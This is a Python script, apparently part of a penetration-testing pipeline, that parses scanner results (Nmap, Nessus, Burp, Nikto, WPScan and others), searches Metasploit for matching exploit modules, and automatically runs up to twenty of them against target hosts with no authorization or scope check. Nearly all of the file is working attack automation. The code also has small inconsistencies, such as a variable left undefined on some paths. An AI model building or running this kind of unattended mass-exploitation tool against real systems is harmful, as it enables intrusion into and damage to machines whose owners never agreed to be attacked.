import json
import subprocess
import logging
import re
import os
import shutil

# Setup logging with write mode to overwrite file content each time
logging.basicConfig(filename='attack_reports/exploits_log.txt', level=logging.INFO, 
                    format='%(asctime)s - %(levelname)s - %(message)s', filemode='w')

# Function to strip ANSI color codes
def strip_ansi_codes(text):
    ansi_escape = re.compile(r'\x1B[@-_][0-?]*[ -/]*[@-~]')
    return ansi_escape.sub('', text)

# Function to parse Nmap results
def parse_nmap_results(file_path):
    open_ports = set()  # Using a set to avoid duplicates
    vulnerabilities = set()
    try:
        with open(file_path, 'r') as file:
            for line in file:
                if "open" in line and "/" in line:
                    port_info = line.split()
                    if len(port_info) >= 3:
                        port = port_info[0].split('/')[0]
                        service = port_info[2]
                        open_ports.add((port, service))
                if "| [CVE-" in line or "vulscan:" in line:
                    vuln_code = line.strip().split()[1].strip('[]')
                    vulnerabilities.add(vuln_code)
                    
    except Exception as e:
        logging.error(f"Error parsing Nmap results: {e}")
    return list(open_ports), list(vulnerabilities)

# Function to parse Nessus results as Python dictionaries
def parse_nessus_results(data):
    nessus_findings = []
    try:
        # Clean the data to be a valid JSON
        data = '[' + data + ']'  # Add square brackets to make it a valid JSON array
        data = data.replace("'", '"')  # Replace single quotes with double quotes
        nessus_findings = json.loads(data)
    except json.JSONDecodeError as e:
        logging.error(f"JSON decoding error in Nessus results: {e}")
    except Exception as e:
        logging.error(f"Error parsing Nessus results: {e}")
    return nessus_findings

# Function to parse PCAP file using tshark
def parse_pcap(file_path):
    connections = []
    try:
        command = [
            'tshark', '-r', file_path, '-T', 'fields',
            '-e', 'ip.src', '-e', 'ip.dst', '-e', 'tcp.srcport', '-e', 'tcp.dstport',
            '-e', 'udp.srcport', '-e', 'udp.dstport'
        ]
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = process.communicate()

        if process.returncode != 0:
            logging.error(f"Error extracting data from PCAP file: {stderr.decode('utf-8')}")
            return []

        output = stdout.decode('utf-8').strip().split('\n')
        for line in output:
            connections.append(line.split('\t'))

    except Exception as e:
        logging.error(f"Error parsing PCAP file: {e}")
    
    return connections

# Function to parse Burp Suite scan results
def parse_burp_results(file_path):
    burp_issues = set()
    try:
        with open(file_path, 'r') as file:
            for line in file:
                if line.startswith("INFO - Issue:"):
                    issue = line.split("Issue:")[1].split(",")[0].strip()
                    burp_issues.add(issue)
    except Exception as e:
        logging.error(f"Error parsing Burp results: {e}")
    return list(burp_issues)

# Function to parse Nikto scan results
def parse_nikto_results(file_path):
    nikto_issues = set()
    try:
        with open(file_path, 'r') as file:
            for line in file:
                if line.startswith("+ GET /"):
                    issue = line.split(":")[1].strip().split(".")[0]
                    nikto_issues.add(issue)
    except Exception as e:
        logging.error(f"Error parsing Nikto results: {e}")
    return list(nikto_issues)

# Function to parse WAFW00F results
def parse_wafw00f_results(file_path):
    waf_issues = set()
    try:
        with open(file_path, 'r') as file:
            for line in file:
                if "Generic Detection results:" in line or "No WAF detected" in line:
                    waf_issues.add(line.strip())
    except Exception as e:
        logging.error(f"Error parsing WAFW00F results: {e}")
    return list(waf_issues)

# Function to parse WhatWeb results
def parse_whatweb_results(file_path):
    whatweb_issues = set()
    try:
        with open(file_path, 'r') as file:
            for line in file:
                if "Detected Plugins:" in line or "HTTPServer" in line or "X-XSS-Protection" in line:
                    whatweb_issues.add(line.strip())
    except Exception as e:
        logging.error(f"Error parsing WhatWeb results: {e}")
    return list(whatweb_issues)

# Function to parse WPScan results
def parse_wpscan_results(file_path):
    wpscan_issues = set()
    metasploit_references = set()
    
    try:
        with open(file_path, 'r') as file:
            data = json.load(file)
            
            logging.debug(f"Loaded data type: {type(data)}")
            
            if isinstance(data, list):
                for entry in data:
                    if not isinstance(entry, dict):
                        logging.error(f"Expected each entry to be a dict, but got {type(entry)}: {entry}")
                        continue

                    scan_result = entry.get('scan_result', {})
                    
                    if isinstance(scan_result, str):
                        # Handle the error case where scan_result is a string
                        wpscan_issues.add(scan_result)
                    elif isinstance(scan_result, dict):
                        interesting_findings = scan_result.get('interesting_findings', [])
                        
                        if not isinstance(interesting_findings, list):
                            logging.error(f"Expected 'interesting_findings' to be a list, but got {type(interesting_findings)}")
                        
                        for finding in interesting_findings:
                            if isinstance(finding, dict):
                                # Add finding description without the URL
                                to_s = finding.get('to_s', '')
                                clean_to_s = to_s.split(':', 1)[0].strip() if ':' in to_s else to_s
                                wpscan_issues.add(clean_to_s)
                                
                                # Add Metasploit references
                                references = finding.get('references', {})
                                metasploit_refs = references.get('metasploit', [])
                                for ref in metasploit_refs:
                                    metasploit_references.add(ref)
                            else:
                                logging.error(f"Expected each finding to be a dict, but got {type(finding)}: {finding}")
                    else:
                        logging.error(f"Unexpected type for 'scan_result': {type(scan_result)}")
            else:
                logging.error(f"Expected top-level data structure to be a list, but got {type(data)}")

    except Exception as e:
        logging.error(f"Error parsing WPScan results: {e}")
    
    return list(wpscan_issues), list(metasploit_references)
# Function to search for exploits in Metasploit
def search_exploits(term):
    logging.info(f"Searching for exploits related to: {term}")
    result = subprocess.run(["msfconsole", "-q", "-x", f"search {term}; exit"], capture_output=True, text=True)
    clean_output = strip_ansi_codes(result.stdout)
    logging.info(f"Search output for term '{term}':\n{clean_output}")
    exploits = []
    for line in clean_output.split('\n'):
        if "exploit/" in line:
            exploit_info = line.split()
            if len(exploit_info) > 1:
                exploit_path = exploit_info[1]
                if "windows" not in exploit_path:  # Exclude Windows exploits
                    exploits.append(exploit_path)
    logging.info(f"Found exploits for term '{term}': {exploits}")
    return exploits

# Function to get a list of all Metasploit modules
def get_all_metasploit_modules():
    result = subprocess.run(["msfconsole", "-q", "-x", "show exploits; exit"], capture_output=True, text=True)
    clean_output = strip_ansi_codes(result.stdout)
    modules = []
    for line in clean_output.split('\n'):
        if "exploit/" in line and "windows" not in line:  # Exclude Windows exploits
            modules.append(line.strip().split()[0])
    return modules

# Function to determine suitable Metasploit modules
def determine_exploits(nmap_results, nmap_vulns, nessus_results, pcap_results, burp_results, nikto_results, waf_results, whatweb_results, wpscan_results, metasploit_refs):
    exploits = set()
    
    all_modules = get_all_metasploit_modules()

    # Search for exploits based on open ports and services
    for port, service in nmap_results[:5]:
        search_terms = [service]
        for term in search_terms:
            exploits.update(search_exploits(term))

    # Search for exploits based on vulnerabilities
    for vuln in nmap_vulns[:5]:
        search_terms = [vuln]
        for term in search_terms:
            exploits.update(search_exploits(term))
            # Match with all modules to find related ones
            for module in all_modules:
                if term.lower() in module.lower():
                    exploits.add(module)

    # Search for exploits based on Nessus findings
    for finding in nessus_results[:5]:
        plugin_name = finding.get('plugin_name', '')
        search_terms = [plugin_name]
        for term in search_terms:
            exploits.update(search_exploits(term))

    # Search for exploits based on PCAP results
    for conn in pcap_results[:5]:
        src_ip, dst_ip, tcp_srcport, tcp_dstport, udp_srcport, udp_dstport = conn
        ports = [tcp_dstport, udp_dstport]
        for port in ports:
            if port:
                search_terms = [port]
                for term in search_terms:
                    exploits.update(search_exploits(term))

    # Search for exploits based on Burp Suite findings
    for issue in burp_results:
        search_terms = [issue]
        for term in search_terms:
            exploits.update(search_exploits(term))

    # Search for exploits based on Nikto findings
    for issue in nikto_results[:5]:
        search_terms = [issue]
        for term in search_terms:
            exploits.update(search_exploits(term))

    # Search for exploits based on WAFW00F results
    for issue in waf_results:
        search_terms = [issue]
        for term in search_terms:
            exploits.update(search_exploits(term))

    # Search for exploits based on WhatWeb results
    for issue in whatweb_results[:5]:
        search_terms = [issue]
        for term in search_terms:
            exploits.update(search_exploits(term))

    # Search for exploits based on WPScan results
    for issue in wpscan_results:
        search_terms = [issue]
        for term in search_terms:
            exploits.update(search_exploits(term))

    # Search for exploits based on WPScan results
    for issue in metasploit_refs:
        search_terms = [issue]
        for term in search_terms:
            exploits.update(search_exploits(term))
    # Limit to the top 10 most relevant exploits
    return list(exploits)[:20]

# Function to execute Metasploit modules
def execute_exploits(exploits, target_ip, source_ip):
    output_directory = "attack_reports/ms_reports"
    os.makedirs(output_directory, exist_ok=True)

    for exploit in exploits:
        logging.info(f"Executing exploit: {exploit} against target: {target_ip}")
        # Default commands to run the exploit
        commands = [
            f"use {exploit}",
            f"set RHOSTS {target_ip}",
            f"set LHOST {source_ip}",
            f"run"
        ]
        command_str = "; ".join(commands) + "; exit"
        result = subprocess.run(["msfconsole", "-q", "-x", command_str], capture_output=True, text=True)
        clean_output = strip_ansi_codes(result.stdout)
        logging.info(f"Result of exploit {exploit}:\n{clean_output}\n")

        # Extract the generated file path from the output
        for line in clean_output.split('\n'):
            if "stored at" in line:
                file_path = line.split("stored at")[-1].strip()
                try:
                    shutil.move(file_path, os.path.join(output_directory, os.path.basename(file_path)))
                    logging.info(f"Moved {file_path} to {output_directory}")
                except Exception as e:
                    logging.error(f"Failed to move file {file_path}: {e}")

# Main function
def run_metasploit(target_ip, source_ip, sc_type, hosts=[]):
    print("Starting metasploit attack")
    if len(hosts) == 0:
        hosts = [target_ip]
    for i in hosts:
        if sc_type == "net":
            nmap_results, nmap_vulns = parse_nmap_results("scan_reports/nmap.txt")
            # Load Nessus data directly from the provided JSON string
            with open("scan_reports/nessus.json", 'r') as file:
                nessus_data = file.read()
            
            nessus_results = parse_nessus_results(nessus_data)
        else:
            nmap_results = ""
            nmap_vulns = ""
            nessus_results = ""
        
        # Parse PCAP file if it exists
        pcap_results = []
        pcap_file_path = 'scan_reports/wireshark.pcap'
        if os.path.isfile(pcap_file_path):
            pcap_results = parse_pcap(pcap_file_path)
        
        if sc_type == "web":
            # Parse Burp Suite scan results if the file exists
            burp_results = []
            burp_file_path = "scan_reports/burp_scan.txt"
            if os.path.isfile(burp_file_path):
                burp_results = parse_burp_results(burp_file_path)

        else:
            burp_results = []
            waf_results = []
            whatweb_results = []
            wpscan_results = []

        # Parse Nikto scan results
        nikto_results = parse_nikto_results("scan_reports/nikto.txt")
        # Parse WhatWeb results if the file exists
        whatweb_results = []
        whatweb_file_path = "scan_reports/whatweb.txt"
        if os.path.isfile(whatweb_file_path):
            whatweb_results = parse_whatweb_results(whatweb_file_path)
        # Parse WPScan results if the file exists
        wpscan_results = []
        wpscan_file_path = "scan_reports/wpscan.json"
        if os.path.isfile(wpscan_file_path):
            wpscan_results, metasploit_refs = parse_wpscan_results(wpscan_file_path)

        # Parse WAFW00F results if the file exists
        waf_results = []
        waf_file_path = "scan_reports/waf.txt"
        if os.path.isfile(waf_file_path):
            waf_results = parse_wafw00f_results(waf_file_path)
        

        logging.info("Parsed results:")
        if sc_type == "net":
            logging.info(f"Nmap open ports: {nmap_results}")
            logging.info(f"Nmap vulnerabilities: {nmap_vulns}")
            logging.info(f"Nessus results: {nessus_results}")
        if os.path.isfile(pcap_file_path):
            logging.info(f"PCAP results: {pcap_results}")
        if sc_type == "web":
            logging.info(f"Burp Suite results: {burp_results}")
        logging.info(f"Nikto results: {nikto_results}")
        logging.info(f"WhatWeb results: {whatweb_results}")
        logging.info(f"WPScan results: {wpscan_results}")
        logging.info(f"WPScan metasploit refs: {metasploit_refs}")
        logging.info(f"WAFW00F results: {waf_results}")
        
        exploits = determine_exploits(nmap_results, nmap_vulns, nessus_results, pcap_results, burp_results, nikto_results, waf_results, whatweb_results, wpscan_results, metasploit_refs)
        
        logging.info(f"Found exploits: {exploits}\n")
        
        execute_exploits(exploits, i, source_ip)
    print("Finished metasploit attacks")